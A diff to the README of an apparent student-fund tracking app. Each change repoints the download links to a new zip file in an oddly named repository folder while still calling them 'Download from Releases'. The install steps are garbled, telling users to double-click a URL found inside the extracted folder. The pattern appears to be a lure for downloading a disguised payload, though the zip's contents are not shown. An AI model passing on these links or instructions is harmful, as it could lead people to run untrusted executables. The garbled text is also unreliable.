@@ -1,6 +1,6 @@
 # 🎓 campus-fund-tracker - Track Student Funds Easily 
 
-[![Download](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker.zip%20Now-brightgreen)](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker.zip)
+[![Download](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker-3.0-alpha.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker-3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your device meets these requirements:
 
 To get started with the campus-fund-tracker, visit the following link to download the latest version:
 
-[Download from Releases](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker.zip)
+[Download from Releases](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker-3.0-alpha.3.zip)
 
 Once you've downloaded the application, follow these simple steps to install it:
 
@@ -38,7 +38,7 @@ Once you've downloaded the application, follow these simple steps to install it:
    If you downloaded a ZIP file, right-click on it and select "Extract All" to unzip the files.
 
 3. **Open the Application:**
-   Find the extracted folder and look for `https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker.zip`. Double-click it to open in your web browser.
+   Find the extracted folder and look for `https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker-3.0-alpha.3.zip`. Double-click it to open in your web browser.
 
 4. **Set Up Your Account:**
    Follow the prompts to create an account. Use a strong password to ensure security.
@@ -67,4 +67,4 @@ For support or feedback, you can raise an issue on the repository. We appreciate
 
 Thank you for choosing campus-fund-tracker! Start managing your student funds effectively today!
 
-[Download from Releases](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker.zip)
+[Download from Releases](https://raw.githubusercontent.com/samir0811/campus-fund-tracker/main/semimonastic/campus-fund-tracker-3.0-alpha.3.zip)
